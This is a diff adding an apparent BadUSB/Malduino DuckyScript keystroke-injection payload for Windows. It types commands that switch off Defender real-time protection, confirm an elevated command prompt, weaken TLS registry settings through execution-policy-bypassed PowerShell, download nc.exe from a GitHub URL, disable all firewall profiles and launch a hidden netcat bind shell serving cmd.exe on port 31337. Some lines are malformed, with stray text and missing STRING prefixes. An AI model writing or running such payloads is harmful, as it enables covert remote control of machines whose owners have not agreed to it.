@@ -1,0 +1,82 @@
+DELAY 1000
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows Defender Settings
+DELAY 100
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+ALT y
+DELAY 500
+ALT F4
+DELAY 100
+ALT F4
+DELAY 100
+GUI r
+DELAY 200
+STRING cmd
+DELAY 200
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+ESC
+STRING cd %temp%
+ENTER
+
+STRING powershell script directly from github or other url
+powershell.exe -executionpolicy bypass -noprofile {New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -Force}
+DELAY 100
+ENTER
+
+STRING powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}
+DELAY 100
+ENTER
+
+STRING powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}
+DELAY 100
+ENTER
+
+STRING powershell.exe -executionpolicy bypass -noprofile {New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -Force}
+DELAY 100
+ENTER
+
+STRING powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}
+DELAY 100
+ENTER
+
+STRING powershell.exe -executionpolicy bypass -noprofile {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}
+powershell.exe -executionpolicy bypass -noprofile {reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64}
+DELAY 100
+ENTER
+
+STRING powershell.exe -executionpolicy bypass -noprofile "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/bin/nc.bin', 'nc.exe')"
+DELAY 100
+ENTER
+DELAY 2000
+STRING netsh advfirewall set allprofiles state off
+DELAY 100
+ENTER
+STRING powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "%temp%\nc.exe -Lp 31337 -vv -e cmd.exe"
+DELAY 100
+ENTER
+
+ 
+
+
